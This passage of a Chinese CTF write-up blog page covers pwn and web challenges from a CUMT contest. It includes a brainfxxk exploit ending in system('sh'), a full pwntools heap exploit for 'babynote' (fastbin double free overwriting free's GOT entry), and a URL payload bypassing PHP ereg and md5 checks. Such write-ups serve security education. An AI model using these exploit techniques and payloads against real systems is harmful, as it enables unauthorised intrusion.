class="line">p.send(p32(libc.symbols[<span class="string">&quot;gets&quot;</span>] + base) + p32(<span class="number">0x8048671</span>) + p32(libc.symbols[<span class="string">&quot;system&quot;</span>] + base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Type brainfuck instructions below:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;\sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h3><p>yt聚(ba)聚(by)的小本本。</p>
+<h4 id="how-1"><a href="#how-1" class="headerlink" title="how"></a>how</h4><p>fastbin attack，delete函数里没有把<strong>指针置0</strong>,因此可通过<strong>double free</strong>构造uaf，修改指针(注意size)，覆盖got_free。</p>
+<p>但是没有system也没libc，后来乱点发现有个magic函数可以直接读取flag（多么灵性の函数名，I’m so 瞎）。<br>于是，把got_free覆盖为magic，再free任意chunk即可。</p>
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babynote&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.106.211.189&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,name,con</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of the name :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;The name of note :&#x27;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;The content of the note:&#x27;</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Which note to delete:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">magic = p64(<span class="number">0x400C7B</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&#x27;yt\n&#x27;</span>, <span class="string">&#x27;ju(ba)\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&#x27;ju(by)\n&#x27;</span>, <span class="string">&#x27;ni\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;jing\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&#x27;ran\n&#x27;</span>,<span class="string">&#x27;chu\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&#x27;yuan\n&#x27;</span>,<span class="string">&#x27;ti\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">14</span>+magic,<span class="string">&#x27;-w-\n&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题-1"><a href="#签到题-1" class="headerlink" title="签到题"></a>签到题</h3><p>是个简单的绕过，给出源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$white_list = range(0,9);</span><br><span class="line">require_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_REQUEST[&#x27;0ver&#x27;]) &amp;&amp; isset($_REQUEST[&#x27;0ver1&#x27;]) &amp;&amp; isset($_REQUEST[&#x27;0ver2&#x27;]))&#123;</span><br><span class="line">    $a = $_REQUEST[&#x27;0ver&#x27;];</span><br><span class="line">    $b = $_REQUEST[&#x27;0ver1&#x27;];</span><br><span class="line">    $c = $_REQUEST[&#x27;0ver2&#x27;];</span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123;</span><br><span class="line">        echo &#x27;no must be number&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(in_array($a,$white_list))&#123;</span><br><span class="line">            if(strlen($a)&gt;1)&#123;</span><br><span class="line">                if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123;</span><br><span class="line">                    echo &quot;&lt;img src=&#x27;dark.png&#x27;&gt;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &#x27;you are a great dark phper&lt;br&gt;&#x27;;</span><br><span class="line">                    echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;you can do it!!!&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;you no dark&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;you are so dark&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else</span><br><span class="line">    highlight_file(__FILE__); </span><br></pre></td></tr></table></figure>
+
+<p>考察<code>ereg()</code>和<code>md5()</code>的绕过姿势，00截断绕过<code>ereg</code>，上传数组绕过<code>md5</code>，即可得到flag如下：</p>
+<p><img src="https://s2.ax1x.com/2019/01/25/kmRqk8.png" alt="kmRqk8.png"></p>
+<p><strong>payload：</strong><code>http://202.119.201.199:32790/index.php?0ver=5%00a&amp;0ver1[]=a&amp;0ver2[]=b</code></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ctf/">ctf</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2019/01/24/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%BA%8C/" data-title="CUMMT双月赛二 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/01/29/靶场/sqli-labs靶场练习/" title="sqli-labs靶场练习">
+  <strong>上一篇：</strong><br/>
+  <span>
+  sqli-labs靶场练习</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/12/20/靶场/Upload-labs文件上传靶场通关/"  title="Upload_labs文件上传靶场通关">
+ <strong>下一篇：</strong><br/> 
+ <span>Upload_labs文件上传靶场通关
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#misc%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">misc签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BXS%E7%9A%84%E5%9B%BE%E6%A0%87%E7%9C%9F%E5%A5%BD%E7%9C%8B"><span class="toc-number">2.2.</span> <span class="toc-text">BXS的图标真好看</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base%E5%85%A8%E5%AE%B6%E6%A1%B6%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">base全家桶了解一下？？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%BF%E5%A4%A7%E6%A0%A1%E6%AD%8C%E8%AE%A4%E7%9C%9F%E5%90%AC%E5%90%AC%E5%90%A7%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">矿大校歌认真听听吧？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%B7%E5%BA%8A%E6%94%B9error%E5%95%A6"><span class="toc-number">5.</span> <span class="toc-text">起床改error啦</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number"></span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">现代密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">古典密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyrsa"><span class="toc-number">3.</span> <span class="toc-text">easyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#playfir"><span class="toc-number">4.</span> <span class="toc-text">playfir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">5.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SimpleUpoad%E7%AD%BE%E5%88%B0"><span class="toc-number">5.2.</span> <span class="toc-text">SimpleUpoad签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SimpleSQLi-1"><span class="toc-number">5.3.</span> <span class="toc-text">SimpleSQLi-1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%9E%8B%E7%BA%BF%E4%B8%8A%E8%B5%8C%E5%9C%BA"><span class="toc-number">6.</span> <span class="toc-text">小型线上赌场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.</span> <span class="toc-text">文件管理系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number"></span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">逆向签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Math"><span class="toc-number">2.</span> <span class="toc-text">Easy_Math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number"></span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-number">1.</span> <span class="toc-text">Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#how"><span class="toc-number">1.1.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">2.</span> <span class="toc-text">login</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#brainfxxk"><span class="toc-number">3.</span> <span class="toc-text">brainfxxk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babynote"><span class="toc-number">4.</span> <span class="toc-text">babynote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#how-1"><span class="toc-number">4.1.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number"></span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98-1"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
